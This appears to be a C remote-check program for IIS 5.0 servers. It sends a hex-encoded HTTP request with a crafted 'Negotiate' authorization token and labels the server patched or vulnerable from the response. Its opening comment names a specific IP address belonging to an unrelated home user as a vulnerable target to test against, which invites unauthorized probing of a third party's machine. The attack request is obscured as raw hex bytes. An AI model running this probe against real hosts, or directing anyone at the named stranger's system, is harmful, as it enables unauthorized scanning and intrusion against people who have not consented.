/* jwlampe modified code from syzop generic fuzzer 
 * again, this is working for me in testing...if you want
 * to test against a known vulnerable system, 66.56.15.132 (some dude on COMCAST 1 hop away from me)
 * */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

char buf[8192];
char buf2[1024];                 //really only want the headers....


#define TIMEOUT 5 


const char req[] =
"\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\x0D\x0A"
"\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E\x3A\x20\x4E"
"\x65\x67\x6F\x74\x69\x61\x74\x65\x20\x24\x52\x67\x33\x4C\x34\x4B"
"\x76\x79\x33\x57\x71\x31\x54\x34\x50\x47\x72\x4A\x41\x53\x77\x33"
"\x51\x55\x31\x58\x4D\x31\x57\x66\x44\x31\x57\x34\x55\x53\x36\x64"
"\x49\x63\x35\x51\x3D\x0D\x0A\x48\x6F\x73\x74\x3A\x20\x31\x39\x32"
"\x2E\x31\x36\x38\x2E\x31\x35\x2E\x39\x37\x0D\x0A\x0D\x0A";


int main(int argc, char *argv[]) {
	struct sockaddr_in addr;
	int s, port = 0, mu ;
	char *host = NULL;
	unsigned int seed;
	struct timeval tv;


        if (argc < 3) {
                fprintf(stdout, "Use: %s [ip] [port] \n", argv[0]);
                exit(1);
        }
	

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stdout, "Port out of range (%d)\n", port);
		exit(1);
	}

        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;

	memset(&addr, 0, sizeof(addr));


	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stdout, "Socket error: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

        setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(host);
	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stdout, "Unable to connect: %s\n", strerror(errno));
		exit(0);
	}

	write(s, req, sizeof(req) - 1);
	memset(&buf2, 0, sizeof(buf2));
        mu=recv(s,buf2,sizeof(buf2),0);

	// ok, so patched == 500 error or 200 OK
	// unpatched throws back a 401...
	// my patched IIS 5.0 gives back a 200 OK
	// I think the 500 comes about when auth is enabled somewhere on the page?????
	//
         if (mu) {	    
	    if(strstr(buf2, "Server: Microsoft-IIS")) {
	        if (strstr(buf2, "HTTP/1.1 500 Server Error")) {
		    fprintf(stderr, "Server Patched\n");
	        } else if (strstr(buf2, "HTTP/1.1 200 OK"))  {
		    fprintf(stderr, "Server Patched\n");
                } else if (strstr(buf2, "Bad Request (Invalid Hostname)")) {
	            fprintf(stderr, "Server Patched\n");
                } else {
		    fprintf(stderr, "***Server VULNERABLE***\n");
		    fprintf(stderr, "***Server returned***\n\n%s\n", buf2);      //remove remove remove
                } 
            }	
	}
	close(s);
	exit(0);
}

